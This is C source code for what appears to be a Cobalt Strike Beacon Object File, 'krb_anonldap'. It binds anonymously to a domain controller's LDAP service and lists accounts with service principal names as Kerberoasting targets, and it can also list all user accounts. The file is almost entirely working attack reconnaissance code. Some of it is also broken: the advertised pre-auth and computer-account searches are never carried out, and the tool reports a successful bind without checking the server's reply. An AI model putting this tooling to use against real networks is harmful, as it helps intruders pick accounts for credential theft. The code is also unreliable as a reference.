/*
 * krb_anonldap - Anonymous LDAP enumeration for Kerberos targets
 *
 * Performs anonymous LDAP queries to discover:
 * - Users with SPNs (Kerberoasting targets)
 * - Users without pre-auth (AS-REP roasting targets)
 * - Computer accounts
 * - Service accounts
 *
 * Usage: krb_anonldap /dc:DC [/spns] [/nopreauth] [/computers] [/users]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* LDAP port */
#define LDAP_PORT 389

/* LDAP message types */
#define LDAP_BIND_REQUEST       0x60
#define LDAP_BIND_RESPONSE      0x61
#define LDAP_SEARCH_REQUEST     0x63
#define LDAP_SEARCH_ENTRY       0x64
#define LDAP_SEARCH_DONE        0x65
#define LDAP_UNBIND_REQUEST     0x42

/* LDAP scope */
#define LDAP_SCOPE_BASE         0
#define LDAP_SCOPE_ONELEVEL     1
#define LDAP_SCOPE_SUBTREE      2

/* userAccountControl flags */
#define UF_DONT_REQUIRE_PREAUTH 0x400000

/* Build LDAP bind request (anonymous) */
static void build_ldap_bind(KRB_BUFFER* out, int msgid) {
    KRB_BUFFER bind, version, name, auth;

    buf_init(&bind, 64);
    buf_init(&version, 8);
    buf_init(&name, 8);
    buf_init(&auth, 8);

    /* version INTEGER (3) */
    asn1_encode_integer(&version, 3);
    buf_append(&bind, version.data, version.length);

    /* name LDAPDN (empty for anonymous) */
    buf_append_byte(&bind, ASN1_OCTETSTRING);
    buf_append_byte(&bind, 0);

    /* authentication CHOICE - simple [0] (empty password) */
    buf_append_byte(&bind, 0x80);  /* context [0] */
    buf_append_byte(&bind, 0);     /* empty */

    /* Message ID */
    KRB_BUFFER msgid_buf;
    buf_init(&msgid_buf, 8);
    asn1_encode_integer(&msgid_buf, msgid);


    buf_append(out, msgid_buf.data, msgid_buf.length);

    /* Bind request [APPLICATION 0] */
    buf_append_byte(out, LDAP_BIND_REQUEST);
    asn1_encode_length(out, bind.length);
    buf_append(out, bind.data, bind.length);


    KRB_BUFFER seq;
    buf_init(&seq, 128);
    buf_append(&seq, out->data, out->length);
    buf_reset(out);
    asn1_wrap(out, ASN1_SEQUENCE, &seq);

    buf_free(&bind);
    buf_free(&version);
    buf_free(&name);
    buf_free(&auth);
    buf_free(&msgid_buf);
    buf_free(&seq);
}

/* Build LDAP search request */
static void build_ldap_search(KRB_BUFFER* out, int msgid, const char* base_dn,
                               const char* filter, const char** attrs, int attr_count) {
    KRB_BUFFER search, tmp;

    buf_init(&search, 1024);
    buf_init(&tmp, 256);

    /* baseObject LDAPDN */
    buf_append_byte(&search, ASN1_OCTETSTRING);
    buf_append_byte(&search, (BYTE)strlen(base_dn));
    buf_append(&search, base_dn, strlen(base_dn));

    /* scope ENUMERATED (subtree = 2) */
    buf_append_byte(&search, ASN1_ENUMERATED);
    buf_append_byte(&search, 1);
    buf_append_byte(&search, LDAP_SCOPE_SUBTREE);

    /* derefAliases ENUMERATED (0 = never) */
    buf_append_byte(&search, ASN1_ENUMERATED);
    buf_append_byte(&search, 1);
    buf_append_byte(&search, 0);

    /* sizeLimit INTEGER (1000) */
    asn1_encode_integer(&tmp, 1000);
    buf_append(&search, tmp.data, tmp.length);
    buf_reset(&tmp);

    /* timeLimit INTEGER (60) */
    asn1_encode_integer(&tmp, 60);
    buf_append(&search, tmp.data, tmp.length);
    buf_reset(&tmp);

    /* typesOnly BOOLEAN (false) */
    buf_append_byte(&search, ASN1_BOOLEAN);
    buf_append_byte(&search, 1);
    buf_append_byte(&search, 0);

    /* filter - simplified substring filter */
    /* Using a basic filter encoding */
    size_t filter_len = strlen(filter);
    buf_append_byte(&search, 0x87);  /* context [7] = present filter as fallback */
    buf_append_byte(&search, (BYTE)filter_len);
    buf_append(&search, filter, filter_len);

    /* attributes SEQUENCE */
    KRB_BUFFER attr_seq;
    buf_init(&attr_seq, 256);
    for (int i = 0; i < attr_count; i++) {
        buf_append_byte(&attr_seq, ASN1_OCTETSTRING);
        buf_append_byte(&attr_seq, (BYTE)strlen(attrs[i]));
        buf_append(&attr_seq, attrs[i], strlen(attrs[i]));
    }
    asn1_wrap(&tmp, ASN1_SEQUENCE, &attr_seq);
    buf_append(&search, tmp.data, tmp.length);
    buf_free(&attr_seq);
    buf_reset(&tmp);

    /* Message ID */
    KRB_BUFFER msgid_buf;
    buf_init(&msgid_buf, 8);
    asn1_encode_integer(&msgid_buf, msgid);


    buf_append(out, msgid_buf.data, msgid_buf.length);

    /* Search request [APPLICATION 3] */
    buf_append_byte(out, LDAP_SEARCH_REQUEST);
    asn1_encode_length(out, search.length);
    buf_append(out, search.data, search.length);


    KRB_BUFFER seq;
    buf_init(&seq, 2048);
    buf_append(&seq, out->data, out->length);
    buf_reset(out);
    asn1_wrap(out, ASN1_SEQUENCE, &seq);

    buf_free(&search);
    buf_free(&tmp);
    buf_free(&msgid_buf);
    buf_free(&seq);
}

/* Parse LDAP search entry and extract attributes */
static int parse_ldap_entry(const BYTE* data, size_t len, formatp* output) {
    size_t offset = 0;

    if (len < 4) return 0;

    /* Skip SEQUENCE header */
    if (data[offset] != ASN1_SEQUENCE) return 0;
    offset++;
    asn1_decode_length(data, &offset);

    /* Skip message ID */
    if (data[offset] == ASN1_INTEGER) {
        offset++;
        size_t id_len = asn1_decode_length(data, &offset);
        offset += id_len;
    }


    if (data[offset] != LDAP_SEARCH_ENTRY) {
        if (data[offset] == LDAP_SEARCH_DONE) {
            return -1;  /* End of results */
        }
        return 0;
    }
    offset++;
    asn1_decode_length(data, &offset);

    /* objectName (DN) */
    if (data[offset] == ASN1_OCTETSTRING) {
        offset++;
        size_t dn_len = asn1_decode_length(data, &offset);
        if (dn_len > 0 && dn_len < 1024) {
            char* dn = (char*)malloc(dn_len + 1);
            if (dn) {
                memcpy(dn, data + offset, dn_len);
                dn[dn_len] = '\0';
                BeaconFormatPrintf(output, "  DN: %s\n", dn);
                free(dn);
            }
        }
        offset += dn_len;
    }

    /* attributes SEQUENCE */
    if (offset < len && data[offset] == ASN1_SEQUENCE) {
        offset++;
        size_t attrs_len = asn1_decode_length(data, &offset);
        size_t attrs_end = offset + attrs_len;

        while (offset < attrs_end && offset < len) {
            /* Each attribute is a SEQUENCE */
            if (data[offset] != ASN1_SEQUENCE) break;
            offset++;
            size_t attr_len = asn1_decode_length(data, &offset);
            size_t attr_end = offset + attr_len;

            /* Attribute name */
            if (data[offset] == ASN1_OCTETSTRING) {
                offset++;
                size_t name_len = asn1_decode_length(data, &offset);
                if (name_len > 0 && name_len < 256) {
                    char* name = (char*)malloc(name_len + 1);
                    if (name) {
                        memcpy(name, data + offset, name_len);
                        name[name_len] = '\0';

                        /* Print attribute name */
                        BeaconFormatPrintf(output, "    %s: ", name);
                        free(name);
                    }
                }
                offset += name_len;
            }

            /* Attribute values SET */
            if (offset < attr_end && data[offset] == ASN1_SET) {
                offset++;
                size_t vals_len = asn1_decode_length(data, &offset);
                size_t vals_end = offset + vals_len;

                int first = 1;
                while (offset < vals_end && offset < len) {
                    if (data[offset] == ASN1_OCTETSTRING) {
                        offset++;
                        size_t val_len = asn1_decode_length(data, &offset);
                        if (val_len > 0 && val_len < 1024) {
                            char* val = (char*)malloc(val_len + 1);
                            if (val) {
                                memcpy(val, data + offset, val_len);
                                val[val_len] = '\0';
                                if (!first) BeaconFormatPrintf(output, ", ");
                                BeaconFormatPrintf(output, "%s", val);
                                first = 0;
                                free(val);
                            }
                        }
                        offset += val_len;
                    } else {
                        offset++;
                    }
                }
                BeaconFormatPrintf(output, "\n");
            }

            offset = attr_end;
        }
    }

    BeaconFormatPrintf(output, "\n");
    return 1;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* dc = NULL;
    int find_spns = 0;
    int find_nopreauth = 0;
    int find_computers = 0;
    int find_users = 0;
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Anonymous LDAP Enumeration\n\n");


    dc = arg_get(&parser, "dc");
    find_spns = arg_exists(&parser, "spns");
    find_nopreauth = arg_exists(&parser, "nopreauth");
    find_computers = arg_exists(&parser, "computers");
    find_users = arg_exists(&parser, "users");

    /* Default to finding SPNs if no options specified */
    if (!find_spns && !find_nopreauth && !find_computers && !find_users) {
        find_spns = 1;
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required\n");
        BeaconFormatPrintf(&output, "\nUsage: krb_anonldap /dc:DC [/spns] [/nopreauth] [/computers] [/users]\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Target DC: %s\n", dc);
    if (find_spns) BeaconFormatPrintf(&output, "[*] Finding: Users with SPNs (Kerberoasting targets)\n");
    if (find_nopreauth) BeaconFormatPrintf(&output, "[*] Finding: Users without pre-auth (AS-REP roasting targets)\n");
    if (find_computers) BeaconFormatPrintf(&output, "[*] Finding: Computer accounts\n");
    if (find_users) BeaconFormatPrintf(&output, "[*] Finding: All user accounts\n");
    BeaconFormatPrintf(&output, "\n");


    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
        goto cleanup;
    }

    /* Connect to LDAP */
    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = WS2_32$htons(LDAP_PORT);
    server.sin_addr.s_addr = WS2_32$inet_addr(dc);

    sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to create socket\n");
        goto cleanup_ws;
    }

    if (WS2_32$connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LDAP service at %s:%d\n", dc, LDAP_PORT);
        goto cleanup_ws;
    }

    BeaconFormatPrintf(&output, "[+] Connected to LDAP service\n");


    KRB_BUFFER bind_req;
    buf_init(&bind_req, 64);
    build_ldap_bind(&bind_req, 1);

    WS2_32$send(sock, (char*)bind_req.data, (int)bind_req.length, 0);
    buf_free(&bind_req);


    BYTE response[4096];
    int recv_len = WS2_32$recv(sock, (char*)response, sizeof(response), 0);
    if (recv_len <= 0) {
        BeaconFormatPrintf(&output, "[-] No response to bind request\n");
        goto cleanup_ws;
    }

    BeaconFormatPrintf(&output, "[+] Anonymous bind successful\n\n");


    int msgid = 2;

    if (find_spns) {
        BeaconFormatPrintf(&output, "=== Users with SPNs (Kerberoasting Targets) ===\n\n");

        /* Note: Anonymous LDAP may have limited access. The filter is simplified. */
        const char* attrs[] = {"sAMAccountName", "servicePrincipalName"};
        KRB_BUFFER search_req;
        buf_init(&search_req, 1024);

        /* Search for servicePrincipalName attribute */
        build_ldap_search(&search_req, msgid++, "", "servicePrincipalName", attrs, 2);

        WS2_32$send(sock, (char*)search_req.data, (int)search_req.length, 0);
        buf_free(&search_req);

        /* Receive and parse entries */
        int count = 0;
        while (1) {
            recv_len = WS2_32$recv(sock, (char*)response, sizeof(response), 0);
            if (recv_len <= 0) break;

            int result = parse_ldap_entry(response, recv_len, &output);
            if (result == -1) break;  /* Search done */
            if (result == 1) count++;
        }

        BeaconFormatPrintf(&output, "[*] Found %d potential Kerberoasting targets\n\n", count);
    }

    if (find_users) {
        BeaconFormatPrintf(&output, "=== User Accounts ===\n\n");

        const char* attrs[] = {"sAMAccountName", "userPrincipalName"};
        KRB_BUFFER search_req;
        buf_init(&search_req, 1024);

        build_ldap_search(&search_req, msgid++, "", "objectClass", attrs, 2);

        WS2_32$send(sock, (char*)search_req.data, (int)search_req.length, 0);
        buf_free(&search_req);

        int count = 0;
        while (1) {
            recv_len = WS2_32$recv(sock, (char*)response, sizeof(response), 0);
            if (recv_len <= 0) break;

            int result = parse_ldap_entry(response, recv_len, &output);
            if (result == -1) break;
            if (result == 1) count++;
        }

        BeaconFormatPrintf(&output, "[*] Found %d user accounts\n\n", count);
    }

    BeaconFormatPrintf(&output, "[*] LDAP enumeration complete\n");
    BeaconFormatPrintf(&output, "\n[!] Note: Anonymous LDAP access may be restricted.\n");
    BeaconFormatPrintf(&output, "[!] Consider using authenticated queries for better results.\n");

cleanup_ws:
    if (sock != INVALID_SOCKET) {
        WS2_32$closesocket(sock);
    }
    WS2_32$WSACleanup();

cleanup:
    if (dc) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
